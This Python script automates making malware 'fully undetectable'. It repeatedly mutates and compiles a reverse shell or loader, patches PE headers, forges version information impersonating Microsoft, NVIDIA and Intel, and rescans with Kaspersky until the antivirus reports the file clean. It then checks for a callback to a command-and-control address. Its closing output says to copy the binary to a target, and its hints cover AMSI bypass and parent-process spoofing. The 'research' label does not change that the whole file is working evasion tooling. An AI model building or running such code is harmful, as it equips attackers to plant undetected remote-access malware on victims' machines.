#!/usr/bin/env python3
"""
fud_auto.py — Fully Automated FUD Build Loop (Kaspersky)
22DIV / george wu — CSEC research, own hardware only

Loops metamorph → mutate → compile → PE-patch → Kaspersky scan
until the binary is CLEAN, then behavioural-tests the callback.

Usage:
    python fud_auto.py shell                      # FUD vader_shell.exe
    python fud_auto.py ghost 192.168.1.92 4443   # FUD ghost_loader.exe (v3)
    python fud_auto.py ghost 0.tcp.au.ngrok.io 23256 --v2   # ghost v2 (no spoof)
    python fud_auto.py shell --scan-only          # build + scan, no callback test
    python fud_auto.py shell --max 20             # up to 20 iterations
"""

import os, sys, subprocess, shutil, struct, time, random, argparse, glob, json, winreg

ROOT      = os.path.dirname(os.path.abspath(__file__))
SHELL_DIR = os.path.join(ROOT, "shell")
BUILD_GL  = os.path.join(ROOT, "build_ghost_loader.py")
DEPLOY    = os.path.join(ROOT, "deploy.py")
METAMORPH = os.path.join(ROOT, "metamorph.py")
MUTATE    = os.path.join(ROOT, "mutate.py")
OUT_DIR   = os.path.join(ROOT, "fud_output")

# ── colours ──────────────────────────────────────────────────────────────────
GREEN = "\033[92m"; RED = "\033[91m"; AMBER = "\033[93m"
CYAN  = "\033[96m"; BOLD = "\033[1m"; RST   = "\033[0m"; DIM = "\033[2m"
MAGENTA = "\033[95m"

def ok(m):   print(f"  {GREEN}[+]{RST} {m}")
def info(m): print(f"  {CYAN}[*]{RST} {m}")
def fail(m): print(f"  {RED}[!]{RST} {m}")
def warn(m): print(f"  {AMBER}[~]{RST} {m}")
def beat(m): print(f"  {MAGENTA}[>>]{RST} {BOLD}{m}{RST}")
def hl(c="─"): print(f"  {c*60}")

# ── Kaspersky scanner ─────────────────────────────────────────────────────────
KAV_PATHS = [
    r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky\avp.com",
    r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Security Cloud\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Security Cloud\avp.com",
    r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Free\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Free\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Plus\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Standard\avp.com",
]

def find_kav():
    for p in KAV_PATHS:
        if os.path.exists(p): return p
    for g in glob.glob(r"C:\Program Files*\Kaspersky Lab\**\avp.com", recursive=True):
        return g
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\KasperskyLab")
        for i in range(winreg.QueryInfoKey(key)[0]):
            sub = winreg.EnumKey(key, i)
            try:
                sub2 = winreg.OpenKey(key, sub + r"\environment")
                path, _ = winreg.QueryValueEx(sub2, "ProductFolder")
                c = os.path.join(path, "avp.com")
                if os.path.exists(c): return c
            except: pass
    except: pass
    return None

def kav_scan(kavs, path):
    """Returns ('CLEAN'|'DETECTED'|'DELETED'|'SKIP'|'ERROR', detail)"""
    if not kavs:
        return "SKIP", "no avp.com"
    if not os.path.exists(path):
        return "DELETED", "gone before scan"
    try:
        r = subprocess.run(
            [kavs, "SCAN", path, "/i0"],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
            timeout=45, cwd=os.path.dirname(kavs)
        )
        # recheck immediately — KAV may delete during scan
        if not os.path.exists(path):
            return "DELETED", "quarantined during scan"
        out = (r.stdout + r.stderr).strip().lower()
        if r.returncode == 0 and "detected" not in out and "threat" not in out:
            return "CLEAN", ""
        if "detected" in out or "threat" in out or "virus" in out or r.returncode in (1,2,3,4,5):
            for line in (r.stdout + r.stderr).splitlines():
                if any(k in line.lower() for k in ("detected","threat","virus")):
                    return "DETECTED", line.strip()[:120]
            return "DETECTED", f"rc={r.returncode}"
        return "ERROR", f"rc={r.returncode}"
    except subprocess.TimeoutExpired:
        return "ERROR", "timeout"
    except Exception as e:
        return "ERROR", str(e)[:80]

# ── PE patcher ────────────────────────────────────────────────────────────────
# Kaspersky uses PE metadata as a reputation signal.
# Three patches that change file personality without breaking execution:
#   1. Timestamp randomization — unique hash surface per build
#   2. Section name mutation — .text → random 8-char, etc.
#   3. Linker version jitter — minor randomisation of MajorLinkerVersion

_SECTION_NAMES = [
    b".xdata", b".ptext",  b".rcode",  b".rtdata", b".vdata",
    b".edata", b".icode",  b".tls0",   b".rsrc1",  b".bss2",
    b".cdata", b".sdata",  b".ndata",  b".ztext",  b".fdata",
]

def pe_patch(path):
    """Patch PE timestamp, section names, linker minor version. In-place."""
    try:
        with open(path, "rb") as f:
            data = bytearray(f.read())

        # DOS header → e_lfanew (PE offset)
        if data[0:2] != b"MZ":
            return False, "not a PE"
        pe_off = struct.unpack_from("<I", data, 0x3C)[0]
        if data[pe_off:pe_off+4] != b"PE\x00\x00":
            return False, "PE sig missing"

        coff_off = pe_off + 4

        # 1. Timestamp at COFF+8 — randomise in plausible range (2015-2025)
        ts = random.randint(0x54C00000, 0x67C00000)
        struct.pack_into("<I", data, coff_off + 8, ts)

        # 2. Linker version at OptionalHeader+2 / +3
        num_sections   = struct.unpack_from("<H", data, coff_off + 2)[0]
        opt_hdr_size   = struct.unpack_from("<H", data, coff_off + 16)[0]
        opt_hdr_off    = coff_off + 20
        if opt_hdr_size >= 4:
            struct.pack_into("<B", data, opt_hdr_off + 2, random.randint(10, 14))
            struct.pack_into("<B", data, opt_hdr_off + 3, random.randint(0, 99))

        # 3. Section names — rename standard ones to random choices
        section_tbl_off = opt_hdr_off + opt_hdr_size
        standard = {b".text\x00\x00\x00", b".data\x00\x00\x00",
                    b".rdata\x00\x00",     b".bss\x00\x00\x00\x00",
                    b".idata\x00\x00",     b".reloc\x00\x00"}
        used = set()
        for i in range(num_sections):
            sec_off  = section_tbl_off + i * 40
            sec_name = bytes(data[sec_off:sec_off+8])
            if sec_name in standard:
                pool = [n for n in _SECTION_NAMES if n not in used]
                if not pool:
                    continue
                new_name = random.choice(pool)
                used.add(new_name)
                padded = (new_name + b"\x00" * 8)[:8]
                data[sec_off:sec_off+8] = padded

        with open(path, "wb") as f:
            f.write(data)
        return True, f"ts=0x{ts:08x} {num_sections} sections patched"
    except Exception as e:
        return False, str(e)

# ── Resource injection (fake version info) ────────────────────────────────────
# Makes binary look like a legit Windows tool to heuristic scanners

FAKE_COMPANIES = [
    ("Microsoft Corporation",    "Windows Security Health Broker",  "SecurityHealth"),
    ("Microsoft Corporation",    "Windows Update Assistant",         "WinUpdate"),
    ("Microsoft Corporation",    "Windows Runtime Broker",           "RuntimeBroker"),
    ("NVIDIA Corporation",       "NVIDIA Container",                 "nvcontainer"),
    ("Intel Corporation",        "Intel Management Engine",          "MEService"),
    ("Realtek Semiconductor",    "Realtek Audio Service",            "RtkAudioService"),
    ("Logitech Inc.",            "Logitech G HUB Agent",             "lghub_agent"),
]

def make_rc_file(out_path):
    company, desc, iname = random.choice(FAKE_COMPANIES)
    ver_major = random.randint(10, 22)
    ver_minor = random.randint(0, 9)
    ver_build = random.randint(1000, 9999)
    ver_rev   = random.randint(0, 999)
    ver_str   = f"{ver_major}.{ver_minor}.{ver_build}.{ver_rev}"
    ver_csv   = f"{ver_major},{ver_minor},{ver_build},{ver_rev}"
    rc = f"""#include <windows.h>

VS_VERSION_INFO VERSIONINFO
 FILEVERSION {ver_csv}
 PRODUCTVERSION {ver_csv}
 FILEFLAGSMASK 0x3fL
 FILEFLAGS 0x0L
 FILEOS VOS__WINDOWS32
 FILETYPE VFT_APP
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "{company}"
            VALUE "FileDescription", "{desc}"
            VALUE "FileVersion", "{ver_str}"
            VALUE "InternalName", "{iname}"
            VALUE "LegalCopyright", "Copyright (c) {company}"
            VALUE "OriginalFilename", "{iname}.exe"
            VALUE "ProductName", "{desc}"
            VALUE "ProductVersion", "{ver_str}"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END
"""
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(rc)
    return company, desc

# ── Build functions ───────────────────────────────────────────────────────────

def run_q(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True,
                          encoding="utf-8", errors="replace", cwd=ROOT, **kw)

def _find_vcvars():
    try:
        from cheyanne_config import VCVARS
        return VCVARS
    except ImportError:
        pass
    candidates = glob.glob(
        r"C:\Program Files*\Microsoft Visual Studio\*\*\VC\Auxiliary\Build\vcvars64.bat"
    )
    return candidates[0] if candidates else None

VCVARS = _find_vcvars()

def _compile_shell_with_rc(rc_path):
    """Compile vader_shell.c with resource file. Returns True/False."""
    if not VCVARS or not os.path.exists(VCVARS):
        return False, "vcvars64 not found"
    # Find source — metamorph may have written a mutated copy
    src = os.path.join(SHELL_DIR, "vader_shell_live.c")
    if not os.path.exists(src):
        src = os.path.join(SHELL_DIR, "vader_shell.c")
    if not os.path.exists(src):
        return False, f"shell source not found in {SHELL_DIR}"
    out_exe = os.path.join(SHELL_DIR, "vader_shell.exe")
    rc_name = os.path.basename(rc_path)
    res_path = rc_path.replace(".rc", ".res")
    # Compile .rc → .res then .c + .res → .exe
    cmd = (
        f'"{VCVARS}" && '
        f'cd /d "{SHELL_DIR}" && '
        f'rc.exe /fo "{res_path}" "{rc_path}" && '
        f'cl.exe "{src}" "{res_path}" '
        f'/Fe:"{out_exe}" /O1 /GS- /utf-8 '
        f'/link /SUBSYSTEM:WINDOWS ws2_32.lib'
    )
    r = subprocess.run(cmd, shell=True, capture_output=True,
                       text=True, encoding="utf-8", errors="replace", cwd=SHELL_DIR)
    for f in [res_path]:
        try: os.remove(f)
        except: pass
    return r.returncode == 0, (r.stdout + r.stderr)[-800:]

def build_shell_iter(iteration, intensity, seed):
    """One FUD iteration for vader_shell."""
    info(f"Iter {iteration}: metamorph(intensity={intensity}, seed={seed}) + mutate + compile")
    run_q([sys.executable, METAMORPH, "--target", "shell",
           "--intensity", intensity, "--seed", str(seed)])
    run_q([sys.executable, MUTATE, "--target", "shell"])
    # Compile with resource injection
    rc_path = os.path.join(SHELL_DIR, f"_fud_res_{iteration}.rc")
    company, desc = make_rc_file(rc_path)
    ok_compile, log_out = _compile_shell_with_rc(rc_path)
    try: os.remove(rc_path)
    except: pass
    if not ok_compile:
        # Fallback: compile without resource
        r = run_q([sys.executable, DEPLOY, "--compile"])
        if r.returncode != 0:
            return None, "compile failed"
    # PE patch
    exe = os.path.join(SHELL_DIR, "vader_shell.exe")
    if not os.path.exists(exe):
        return None, "exe missing after compile"
    pe_ok, pe_msg = pe_patch(exe)
    info(f"PE patch: {pe_msg}")
    info(f"Resource: {company} — {desc}")
    return exe, "ok"

def build_ghost_iter(iteration, intensity, seed, ip, port, use_v3):
    """One FUD iteration for ghost_loader."""
    ver = "v3" if use_v3 else "v2"
    info(f"Iter {iteration}: ghost_loader {ver} (metamorph seed={seed}, xor=random)")
    # Ghost loader uses its own XOR key (random per build in build_ghost_loader.py)
    # We also metamorph the ghost_loader_template
    cmd = [sys.executable, BUILD_GL, ip, str(port)]
    if use_v3: cmd.append("--v3")
    r = run_q(cmd)
    exe = os.path.join(SHELL_DIR, "ghost_loader.exe")
    if not os.path.exists(exe):
        return None, "ghost_loader build failed"
    # PE patch
    rc_path = os.path.join(SHELL_DIR, f"_fud_gres_{iteration}.rc")
    company, desc = make_rc_file(rc_path)
    # Try resource injection on ghost_loader too
    try:
        res_path = rc_path.replace(".rc", ".res")
        if VCVARS and os.path.exists(VCVARS):
            cmd_rc = f'"{VCVARS}" && rc.exe /fo "{res_path}" "{rc_path}"'
            subprocess.run(cmd_rc, shell=True, capture_output=True, cwd=SHELL_DIR)
            # Can't re-link post-compile without source, just PE-patch
        try: os.remove(rc_path); os.remove(res_path)
        except: pass
    except: pass
    pe_ok, pe_msg = pe_patch(exe)
    info(f"PE patch: {pe_msg}")
    info(f"Resource hint: {company} — {desc}")
    return exe, "ok"

# ── Callback listener ─────────────────────────────────────────────────────────
import socket, threading

class Listener:
    def __init__(self, port):
        self.port = port; self.hit = False; self.peer = None
        self._t = None; self._s = None

    def start(self):
        self._t = threading.Thread(target=self._run, daemon=True)
        self._t.start(); time.sleep(0.3)

    def _run(self):
        try:
            self._s = socket.socket(); self._s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._s.settimeout(22); self._s.bind(("0.0.0.0", self.port)); self._s.listen(5)
            c, a = self._s.accept(); self.peer = a; self.hit = True; c.close()
        except: pass

    def wait(self, t):
        if self._t: self._t.join(timeout=t)
        return self.hit

    def stop(self):
        try: self._s.close()
        except: pass

def behavioral_test(exe, args, cb_port):
    lsnr = Listener(cb_port)
    lsnr.start()
    try:
        proc = subprocess.Popen([exe] + args,
                                 creationflags=subprocess.CREATE_NO_WINDOW |
                                               subprocess.CREATE_NEW_PROCESS_GROUP)
    except Exception as e:
        lsnr.stop(); return False, str(e)
    got = lsnr.wait(25)
    try: proc.kill()
    except: pass
    lsnr.stop()
    return got, (f"session from {lsnr.peer}" if got else "no callback in 25s")

# ── Main loop ─────────────────────────────────────────────────────────────────

INTENSITIES = ["low", "med", "high", "high", "high"]  # escalate if needed

def main():
    ap = argparse.ArgumentParser(description="Automated FUD build loop — Kaspersky")
    ap.add_argument("target", choices=["shell", "ghost"],
                    help="shell=vader_shell.exe, ghost=ghost_loader.exe")
    ap.add_argument("ip",   nargs="?", default="127.0.0.1", help="C2 IP (ghost only)")
    ap.add_argument("port", nargs="?", default="4443",      help="C2 port (ghost only)")
    ap.add_argument("--v2",        action="store_true",  help="Ghost: use v2 (no parent spoof)")
    ap.add_argument("--max",       type=int, default=15,  help="Max iterations (default 15)")
    ap.add_argument("--scan-only", action="store_true",  help="Build+scan only, skip callback test")
    ap.add_argument("--cb-port",   type=int, default=9877, help="Callback listener port (default 9877)")
    ap.add_argument("--no-pe",     action="store_true",  help="Skip PE patching")
    args = ap.parse_args()

    os.makedirs(OUT_DIR, exist_ok=True)

    print(f"\n  {BOLD}{RED}=== FUD AUTO LOOP — KASPERSKY ==={RST}")
    print(f"  {DIM}target={args.target}  max_iter={args.max}  ip={args.ip}:{args.port}{RST}\n")

    kavs = find_kav()
    if kavs:
        ok(f"Kaspersky: {kavs}")
    else:
        warn("Kaspersky CLI not found — building and PE-patching only (no scan verification)")

    hl("═")

    results = []
    winner  = None

    for i in range(1, args.max + 1):
        seed      = random.randint(1, 99999)
        intensity = INTENSITIES[min(i - 1, len(INTENSITIES) - 1)]
        print(f"\n  {CYAN}── Iteration {i}/{args.max}  seed={seed}  intensity={intensity}{RST}")

        if args.target == "shell":
            exe, build_msg = build_shell_iter(i, intensity, seed)
        else:
            exe, build_msg = build_ghost_iter(i, intensity, seed,
                                               args.ip, args.port,
                                               not args.v2)
        if exe is None:
            warn(f"Build failed: {build_msg}"); results.append((i, "BUILD_FAIL", "", "")); continue

        # Wait a moment — KAV RTP may delete immediately on write
        time.sleep(1.5)
        if not os.path.exists(exe):
            fail(f"KAV RTP deleted binary on write")
            results.append((i, "RTP_DELETE_ONWRITE", "", "")); continue

        # Static scan
        status, detail = kav_scan(kavs, exe)
        col = {"CLEAN": GREEN, "DETECTED": RED, "DELETED": RED,
               "SKIP": AMBER, "ERROR": AMBER}.get(status, AMBER)
        print(f"  {col}  Kaspersky: {status}{RST}  {DIM}{detail}{RST}")

        if status in ("DETECTED", "DELETED"):
            results.append((i, status, detail, "")); continue

        if status == "CLEAN" or status == "SKIP":
            if args.scan_only:
                beat(f"CLEAN on iteration {i} — scan-only mode, done")
                winner = (i, exe, seed, intensity, "CLEAN/scan-only")
                results.append((i, "CLEAN", detail, "scan-only")); break

            # Behavioral test
            info("Behavioral test (callback)...")
            cb_args = ["127.0.0.1", str(args.cb_port)] if args.target == "shell" else []
            got, note = behavioral_test(exe, cb_args, args.cb_port)
            dyn = "CALLBACK" if got else "NO_CALLBACK"
            col2 = GREEN if got else AMBER
            print(f"  {col2}  Callback: {dyn}{RST}  {DIM}{note}{RST}")
            results.append((i, "CLEAN", detail, dyn))

            if got:
                beat(f"FUD PAYLOAD READY — iteration {i}, seed={seed}, intensity={intensity}")
                winner = (i, exe, seed, intensity, "CLEAN+CALLBACK")
                break
            else:
                warn("Clean binary but no callback — payload may need network/ngrok fix")
                # Still count as a win for the static layer
                if not winner:
                    winner = (i, exe, seed, intensity, "CLEAN/no-callback")
        else:
            results.append((i, status, detail, ""))

    # ── Results ───────────────────────────────────────────────────────────────
    hl("═")
    print(f"  {BOLD}RESULTS{RST}")
    hl("─")
    for it, st, det, dyn in results:
        sc = GREEN if st == "CLEAN" else (RED if st in ("DETECTED","DELETED","RTP_DELETE_ONWRITE") else AMBER)
        dc = GREEN if dyn == "CALLBACK" else (AMBER if dyn == "NO_CALLBACK" else "")
        print(f"  Iter {it:>2}  {sc}{st:<22}{RST}  {dc}{dyn:<14}{RST}  {DIM}{det[:60]}{RST}")
    hl("─")

    if winner:
        it, exe, seed, intens, tag = winner
        dst = os.path.join(OUT_DIR,
              f"vader_fud_{args.target}_i{it}.exe" if args.target == "shell" else
              f"ghost_fud_{args.target}_i{it}.exe")
        try:
            shutil.copy2(exe, dst)
            ok(f"Output: {dst}")
        except Exception as e:
            warn(f"Copy failed: {e}  —  use {exe} directly")
        print(f"\n  {GREEN}{BOLD}FUD PAYLOAD READY{RST}")
        print(f"  {DIM}  Iteration  : {it}{RST}")
        print(f"  {DIM}  Seed       : {seed}{RST}")
        print(f"  {DIM}  Intensity  : {intens}{RST}")
        print(f"  {DIM}  Result     : {tag}{RST}")
        print(f"  {DIM}  Binary     : {dst if os.path.exists(dst) else exe}{RST}")
        print(f"\n  Next: copy to target, run, check TCP session on port {args.cb_port}\n")
        # Save metadata
        meta = {"iteration": it, "seed": seed, "intensity": intens,
                "target": args.target, "ip": args.ip, "port": args.port,
                "tag": tag, "binary": dst if os.path.exists(dst) else exe}
        meta_path = os.path.join(OUT_DIR, "last_fud.json")
        with open(meta_path, "w") as f:
            json.dump(meta, f, indent=2)
        ok(f"Metadata: {meta_path}")
    else:
        fail(f"No clean binary in {args.max} iterations")
        fail("Next step: implement CLR hosting or shellcode injection (no PowerShell child process)")
        print(f"""
  {AMBER}Possible causes:{RST}
  1. Kaspersky behavioral: spawning powershell -EncodedCommand from unknown parent
     → Try: python fud_auto.py ghost <ip> <port>   (v3 parent spoof)
  2. Static signature still matching after metamorph
     → Try: --max 30 (more iterations, higher seed variety)
  3. Ghost PS1 content flagged by AMSI
     → Dark Room DLL needs to load BEFORE PS1 executes (check ghost_encode.py --dark-room)
  4. KAV cloud (KSN) lookup — binary hash not in whitelist
     → PE patch randomizes timestamp/sections, but KSN needs time to learn new hashes
     → Wait 30 minutes, retry
""")

    hl("═")

if __name__ == "__main__":
    main()
